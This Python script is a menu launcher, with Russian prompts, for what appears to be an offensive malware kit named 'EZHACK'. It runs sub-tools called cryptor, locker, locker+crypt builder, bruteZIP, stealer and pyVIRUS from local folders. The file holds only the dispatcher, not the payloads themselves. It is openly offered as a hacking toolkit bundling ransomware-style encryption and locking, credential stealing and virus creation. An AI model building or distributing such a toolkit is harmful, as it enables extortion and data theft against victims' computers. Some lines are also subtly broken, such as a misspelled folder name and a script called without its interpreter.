import os
import colorama
from colorama import init
from colorama import Fore, Back, Style
os.system('clear')
print('\033[33m'+""" _____ ______   _    _    ____ _  __
| ____|__  | | | |  / \  / ___| |/ /
|  _|   / /| |_| | / _ \| |   | ' / 
| |___ / /_|  _  |/ ___ | |___| . \ 
|_____/____|_| |_/_/   \_\____|_|\_\
                                    """)
                                    
print('\r\n\033[33m Автор:sudoreboot2020')
#автор утилит , которые юзаются в скрипте - https://www.youtube.com/channel/UCqqISS-PyCnhjbpXqhclvaQ

print("""\033[33m
Выберите утилиту:
[1] - cryptor
[2] - locker
[3] - locker+crypt
[4] - bruteZIP
[5] - stealer
[6] - pyVIRUS
[99] - ВЫХОД
""")
while True:
    a = str(input("""\033[35m\033[5m[*] \033[39m"""))
    if a == ('1'):
        os.chdir('cryptor')
        os.system('clear')
        os.system('python3 shifrovalshik.py')
    elif a ==('2'):
        os.chdir('locker')
        os.system('clear')
        os.system('python3 locker.py')
    elif a ==('3'):
        os.chdir('locker+crypt')
        os.system('clear')
        os.system('python3 builder_cl.py')
    elif a ==('4'):
        os.chdir('brutreZIP')
        os.system('clear')
        os.system('python3 brutezip.py')
    elif a ==('5'):
        os.chdir('stealer')
        os.system('clear')
        os.system('MAINstealer.py')
    elif a ==('6'):
        os.chdir('pyVIRUS')
        os.system('clear')
        os.system('python3 pyvirus.py')
    elif a == ('99'):
        print("\033[31mBye")
        break
